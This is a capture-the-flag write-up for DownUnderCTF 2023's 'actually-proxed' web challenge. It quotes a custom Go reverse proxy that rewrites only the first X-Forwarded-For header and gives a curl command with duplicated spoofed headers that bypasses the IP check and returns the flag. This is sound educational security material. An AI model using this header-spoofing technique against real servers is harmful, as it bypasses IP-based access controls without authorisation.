# DownUnderCTF 2023

## actually-proxed

> Still cool haxxorz only!!! Except this time I added in a reverse proxy for extra security. Nginx and the standard library proxy are waaaayyy too slow (amateurs). So I wrote my own :D
>
>  Author: Jordan Bertasso
>
> [`actually-proxed.tar.gz`](actually-proxed.tar.gz)

Tags: _web_

## Solution
This challenge is kind of a follow up challenge to [`proxed`](../proxed/README.md). But this time a real `proxy` process is implemented. 

```go
for i, v := range headers {
            if strings.ToLower(v[0]) == "x-forwarded-for" {
                    headers[i][1] = fmt.Sprintf("%s, %s", v[1], clientIP)
                    break
            }
    }

    headerMap := make(map[string][]string)
    for _, v := range headers {
            value := headerMap[v[0]]

            if value != nil {
                    value = append(value, v[1])
            } else {
                    value = []string{v[1]}
            }

            headerMap[v[0]] = value
    }

    request := &http.Request{
            Method:        method,
            URL:           &url.URL{Scheme: "http", Host: targetHost, Path: path},
            Proto:         version,
            ProtoMajor:    1,
            ProtoMinor:    1,
            Header:        headerMap,
            Body:          io.NopCloser(reader),
            ContentLength: int64(reader.Len()),
    }
```

The proxy will request the `x-forwarded-for` header value with the actual client ip, therefore we cannot use the same exploit as in the previous challenge. But the proxy code breaks after the first found occurrence of `x-forwarded-for` meaning, we can just pass multiple spoofed x-forwarded-for headers, the first will be replaced, but all others are kept intact. Since the last occurence is considered when calling `request.Header.Values("X-Forwarded-For")` we still can spoof the ip address.

```bash
$ curl http://actually.proxed.duc.tf:30009/ -H "X-Forwarded-For: 1337" -H "X-Forwarded-For: 31.33.33.7"
DUCTF{y0ur_c0d3_15_n07_b3773r_7h4n_7h3_574nd4rd_l1b}
```

Flag `DUCTF{y0ur_c0d3_15_n07_b3773r_7h4n_7h3_574nd4rd_l1b}`